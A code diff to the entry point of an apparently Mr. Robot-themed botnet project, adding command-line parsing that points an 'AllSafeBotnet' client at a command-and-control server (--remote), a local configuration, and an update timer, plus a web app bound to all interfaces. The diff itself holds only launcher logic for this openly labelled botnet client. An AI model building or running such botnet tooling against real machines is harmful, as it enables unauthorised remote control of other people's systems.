@@ -166,7 +166,51 @@ if __name__ == "__main__":
     print("  - Alessio 'Tyrell' Moretti                                 ")
     print("  - Federico 'Elliot' Vagnoni                                ")
     print("-------------------------------------------------------------")
-    # check for command line headless mode - autopilot(override=false)
+    
+    if len(sys.argv) == 1:
+        app.run(host='0.0.0.0', port=4042)
+
+    # check for command line headless mode arguments 
+    for argument in sys.argv:
+        # presetting autopilot timer 
+        autopilot_timer = 5
+
+        if '--timer' in argument:
+            try:
+                autopilot_timer = argument.split("=")[1]
+                autopilot_timer = int(autopilot_timer)
+                if autopilot_timer < 0:
+                    autopilot_timer = 0
+            except Exception:
+                print("Error entering autopilot mode - timer was invalid")
+                sys.exit(EnvironmentError)
+
+        if '--remote' in argument:
+            try:
+                cc_server = argument.split("=")[1]
+                print("- botnet C&C located at:", cc_server)
+                allsafe = Botnet.AllSafeBotnet()
+                allsafe.autopilot(cc_server, "", autopilot_timer, override=False)
+            except Exception:
+                print("Error entering autopilot mode - invalid remote address")
+                sys.exit(EnvironmentError)
+
+        elif '--config' in argument:
+            try:
+                configuration = sys.argv[sys.argv.index('--config') + 1]
+                print("- botnet client configuration at:", configuration)
+                allsafe.autopilot("", configuration, autopilot_timer, override=True)
+            except Exception:
+                print('Error entering autopilot mode - local configuration')
+                sys.exit(EnvironmentError)
+
+        elif '--help'   in argument:
+            print("Usage: python3 __init__.py [--OPTION=value]")
+            print(" --remote=<remote address for c&c server>")
+            print(" --config=<configuration file complete path>")
+            print(" --timer=<integer between each update request to C&C")
+
+
     if '--detach' in sys.argv:
         if '--remote' in sys.argv:
             try:
